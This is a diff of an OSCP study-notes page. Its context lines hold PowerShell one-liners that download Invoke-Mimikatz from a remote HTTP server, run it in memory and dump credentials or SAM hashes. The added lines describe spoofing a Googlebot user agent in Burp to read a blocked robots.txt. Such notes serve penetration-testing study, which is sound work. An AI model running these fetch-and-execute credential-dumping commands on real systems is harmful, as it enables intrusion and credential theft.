@@ -13,6 +13,14 @@ description: Just some rough notes in preparation for the OSCP.
 * Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
+* If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
+  *   `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
+
+      ####
+
+      \
+      \
+
 
 ### Helpful Blogs
 
